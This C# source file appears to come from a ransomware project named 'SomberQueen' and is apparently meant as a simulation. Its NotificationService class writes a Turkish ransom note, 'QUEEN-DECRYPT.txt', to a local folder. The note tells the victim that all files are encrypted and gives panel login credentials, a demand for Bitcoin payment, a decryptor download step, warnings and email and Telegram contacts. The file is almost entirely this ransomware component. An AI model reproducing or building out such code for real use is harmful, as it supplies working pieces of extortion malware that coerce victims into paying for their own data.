using System;
using System.Diagnostics.Metrics;
using System.IO;
using SomberQueen.Utilities;

public class NotificationService
{
    private const string PANEL_URL = "https://localhost:7021"; 

    public void SaveVictimInstructions(string username, string password)
    {
        string message = $@"
╔══════════════════════════════════════════════════════════════════════════════╗
║                             QUEEN RANSOMWARE                                 ║
╚══════════════════════════════════════════════════════════════════════════════╝

!!! TÜM DOSYALARINIZ ŞİFRELENDİ !!!

Endişelenmeyin, tüm dosyalarınızı geri alabilirsiniz!
Dosyalarınızı çözmek için özel bir yazılım ve şifre çözme anahtarı gereklidir.

► Dosyalarınızı kurtarmak için yapmanız gerekenler:

1. Web panelimize giriş yapın:
   URL: {PANEL_URL}
   Kullanıcı Adı: {username}
   Parola: {password}

2. Bitcoin ile ödeme yapın
3. SomberDecryptor'u indirin
4. Dosyalarınızı kurtarın

!!! UYARILAR !!!
* Dosya uzantılarını değiştirmeye çalışmayın
* Şifrelenmiş dosyaları silmeyin
* Şifre çözme programını değiştirmeyin
* Sistem saatini değiştirmeyin

► İletişim:
E-posta: queen@ransomware.com
Telegram: @queen_support

NOT: Bu bir simülasyonudur.
";
        
        try
        {
            string desktop = @"C:\Users\metin\OneDrive\Desktop\cry";
            string instructionsPath = Path.Combine(desktop, "QUEEN-DECRYPT.txt");
            File.WriteAllText(instructionsPath, message);
        }
        catch (Exception ex)
        {
            Logger.WriteLog($"Talimat dosyası oluşturulurken hata: {ex.Message}");
            throw;
        }
    }
} 